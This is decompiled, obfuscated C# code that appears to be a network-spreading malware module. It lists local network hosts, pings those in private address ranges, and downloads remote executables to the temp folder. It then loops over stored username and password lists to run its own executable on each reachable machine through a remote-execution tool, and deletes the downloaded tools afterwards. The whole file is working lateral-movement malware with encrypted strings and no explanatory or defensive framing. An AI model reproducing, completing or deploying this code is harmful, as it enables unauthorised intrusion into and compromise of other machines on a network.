using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bmDbQpaZORfnY;

internal sealed class ALWxYxJSCzwHN
{
	private sealed class MgiSnpUguQn
	{
		public string uUwPHHFKIFp;

		public string RmTWmCBPKRb;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107405410)) && !string_0.StartsWith(getString_0(107405405)) && !string_0.StartsWith(getString_0(107405428)) && !string_0.Contains(getString_0(107391619))) || !VmalepMpQuPxom(string_0))
			{
				return;
			}
			if (qMBmfvOoVnw.MgoyMcoTcpa == getString_0(107396975))
			{
				for (int i = 0; i < dBXuMYPvgvo.Count; i++)
				{
					if (qMBmfvOoVnw.SoTONMHChTZ)
					{
						if (File.Exists(uUwPHHFKIFp))
						{
							qMBmfvOoVnw.OVDOHnvaqGQX(uUwPHHFKIFp, getString_0(107390168) + string_0 + getString_0(107404605) + dBXuMYPvgvo[i] + getString_0(107404628) + XbZzMkCTCYs[i] + getString_0(107404619) + Assembly.GetEntryAssembly()!.Location + getString_0(107390154));
						}
					}
					else if (File.Exists(RmTWmCBPKRb))
					{
						qMBmfvOoVnw.OVDOHnvaqGQX(RmTWmCBPKRb, getString_0(107390168) + string_0 + getString_0(107404605) + dBXuMYPvgvo[i] + getString_0(107404628) + XbZzMkCTCYs[i] + getString_0(107404586) + Assembly.GetEntryAssembly()!.Location + getString_0(107390154));
					}
				}
			}
			else if (qMBmfvOoVnw.SoTONMHChTZ)
			{
				if (File.Exists(uUwPHHFKIFp))
				{
					qMBmfvOoVnw.OVDOHnvaqGQX(uUwPHHFKIFp, getString_0(107390168) + string_0 + getString_0(107404529) + Assembly.GetEntryAssembly()!.Location + getString_0(107390154));
				}
			}
			else if (File.Exists(RmTWmCBPKRb))
			{
				qMBmfvOoVnw.OVDOHnvaqGQX(RmTWmCBPKRb, getString_0(107390168) + string_0 + getString_0(107404496) + Assembly.GetEntryAssembly()!.Location + getString_0(107390154));
			}
		}

		static MgiSnpUguQn()
		{
			Strings.CreateGetStringDelegate(typeof(MgiSnpUguQn));
		}
	}

	public static List<string> kYdlWFOzCAAgdic;

	public static string KijAUrdLyOXzGIzvN;

	public static List<string> dBXuMYPvgvo;

	public static List<string> XbZzMkCTCYs;

	public static List<string> BBiWFszzahhGZNT;

	public List<string> rwxalRWujQFEYvvq = new List<string>();

	public List<string> hkBkzoGJQN = new List<string>();

	public List<string> woZnHblWLRcNTvrk = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void obuCHlRegGA()
	{
		MgiSnpUguQn CS_0024_003C_003E8__locals0 = new MgiSnpUguQn();
		qMBmfvOoVnw.oxhjEFnvlv();
		List<ZZMLNbqaAYpF> list = ZZMLNbqaAYpF.jdEdrCVupTZjaf();
		foreach (ZZMLNbqaAYpF item in list)
		{
			kYdlWFOzCAAgdic.Add(item.IPAddress);
		}
		if (qMBmfvOoVnw.rmMGjONPcxR.Count > 0)
		{
			kYdlWFOzCAAgdic = kYdlWFOzCAAgdic.Union(qMBmfvOoVnw.rmMGjONPcxR).ToList();
		}
		CS_0024_003C_003E8__locals0.uUwPHHFKIFp = getString_0(107391616);
		CS_0024_003C_003E8__locals0.RmTWmCBPKRb = getString_0(107391616);
		try
		{
			CS_0024_003C_003E8__locals0.uUwPHHFKIFp = HSthcNjurhEHL();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.RmTWmCBPKRb = cuJyaEOFghsks();
		}
		catch
		{
		}
		foreach (ZZMLNbqaAYpF item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107405407)) || item2.IPAddress.StartsWith(getString_0(107405402)) || item2.IPAddress.StartsWith(getString_0(107405425)) || item2.IPAddress.Contains(getString_0(107391616)))
				{
					DawZRGCsVLnUUe.jzQfCgoBHwRflaYd(item2.MacAddress, item2.IPAddress, getString_0(107405380));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(kYdlWFOzCAAgdic, delegate(string string_0)
			{
				if ((string_0.StartsWith(MgiSnpUguQn.getString_0(107405410)) || string_0.StartsWith(MgiSnpUguQn.getString_0(107405405)) || string_0.StartsWith(MgiSnpUguQn.getString_0(107405428)) || string_0.Contains(MgiSnpUguQn.getString_0(107391619))) && VmalepMpQuPxom(string_0))
				{
					if (qMBmfvOoVnw.MgoyMcoTcpa == MgiSnpUguQn.getString_0(107396975))
					{
						for (int i = 0; i < dBXuMYPvgvo.Count; i++)
						{
							if (qMBmfvOoVnw.SoTONMHChTZ)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.uUwPHHFKIFp))
								{
									qMBmfvOoVnw.OVDOHnvaqGQX(CS_0024_003C_003E8__locals0.uUwPHHFKIFp, MgiSnpUguQn.getString_0(107390168) + string_0 + MgiSnpUguQn.getString_0(107404605) + dBXuMYPvgvo[i] + MgiSnpUguQn.getString_0(107404628) + XbZzMkCTCYs[i] + MgiSnpUguQn.getString_0(107404619) + Assembly.GetEntryAssembly()!.Location + MgiSnpUguQn.getString_0(107390154));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.RmTWmCBPKRb))
							{
								qMBmfvOoVnw.OVDOHnvaqGQX(CS_0024_003C_003E8__locals0.RmTWmCBPKRb, MgiSnpUguQn.getString_0(107390168) + string_0 + MgiSnpUguQn.getString_0(107404605) + dBXuMYPvgvo[i] + MgiSnpUguQn.getString_0(107404628) + XbZzMkCTCYs[i] + MgiSnpUguQn.getString_0(107404586) + Assembly.GetEntryAssembly()!.Location + MgiSnpUguQn.getString_0(107390154));
							}
						}
					}
					else if (qMBmfvOoVnw.SoTONMHChTZ)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.uUwPHHFKIFp))
						{
							qMBmfvOoVnw.OVDOHnvaqGQX(CS_0024_003C_003E8__locals0.uUwPHHFKIFp, MgiSnpUguQn.getString_0(107390168) + string_0 + MgiSnpUguQn.getString_0(107404529) + Assembly.GetEntryAssembly()!.Location + MgiSnpUguQn.getString_0(107390154));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.RmTWmCBPKRb))
					{
						qMBmfvOoVnw.OVDOHnvaqGQX(CS_0024_003C_003E8__locals0.RmTWmCBPKRb, MgiSnpUguQn.getString_0(107390168) + string_0 + MgiSnpUguQn.getString_0(107404496) + Assembly.GetEntryAssembly()!.Location + MgiSnpUguQn.getString_0(107390154));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.uUwPHHFKIFp))
			{
				File.Delete(CS_0024_003C_003E8__locals0.uUwPHHFKIFp);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.RmTWmCBPKRb))
			{
				File.Delete(CS_0024_003C_003E8__locals0.RmTWmCBPKRb);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string HSthcNjurhEHL()
	{
		if (IntPtr.Size == 8)
		{
			return KtwIBlDOnesa(new Uri(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107405391))));
		}
		return KtwIBlDOnesa(new Uri(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107405391))));
	}

	public static string cuJyaEOFghsks()
	{
		if (IntPtr.Size == 8)
		{
			return KtwIBlDOnesa(new Uri(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107405278))));
		}
		return KtwIBlDOnesa(new Uri(qMBmfvOoVnw.EGPIgSWIAKjM(getString_0(107405233))));
	}

	public static bool VmalepMpQuPxom(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string KtwIBlDOnesa(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107404648), getString_0(107391616)).Remove(0, 3) + getString_0(107404611);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static ALWxYxJSCzwHN()
	{
		Strings.CreateGetStringDelegate(typeof(ALWxYxJSCzwHN));
		kYdlWFOzCAAgdic = new List<string>();
		KijAUrdLyOXzGIzvN = getString_0(107391616);
		dBXuMYPvgvo = new List<string>();
		XbZzMkCTCYs = new List<string>();
		BBiWFszzahhGZNT = new List<string>();
	}
}
